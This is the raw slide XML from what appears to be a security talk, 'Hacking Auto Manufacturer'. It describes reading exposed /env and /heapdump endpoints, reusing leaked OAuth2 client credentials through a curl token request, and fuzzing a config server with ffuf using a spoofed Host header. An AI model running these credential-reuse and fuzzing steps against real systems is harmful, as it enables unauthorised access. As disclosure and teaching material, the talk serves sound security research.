              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>/env</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>/heapdump</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Google Shape;106;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="110" name="Shape 110"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Google Shape;111;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;112;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Google Shape;113;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="7233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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Google Shape;114;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8398200" cy="16500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 sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Looked through the environment variables in /env</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>It contained:</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>a config server URL </a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>the oauth2 endpoint + creds:</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Google Shape;115;p20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="116" name="Google Shape;116;p20"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="35014" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="635763" y="3415700"/>
            <a:ext cx="7021423" cy="154710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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="120" name="Shape 120"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Google Shape;121;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;122;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Google Shape;123;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="7233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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Google Shape;124;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="860675" y="1039325"/>
            <a:ext cx="8009700" cy="47655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 sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>What if we use the oauth2 credentials, vhost to the config server, &amp; fuzz it for endpoints?</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ curl https://uaa.redacted.example.com/oauth/token -d 'client_id=config…&amp;client_secret=redacted&amp;grant_type=client_credentials'</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Got an access token…vhost to the config-server w/ the access token &amp; fuzz.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ffuf -u http://ingress-server/FUZZ </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>“Host: config-server.redacted.example.com”</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>“Authorization: Bearer…”</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Google Shape;125;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="129" name="Shape 129"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Google Shape;130;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;131;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Google Shape;132;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="7233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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking Auto Manufacturer</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Google Shape;133;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950400" y="1289150"/>
            <a:ext cx="7595100" cy="33033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 sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
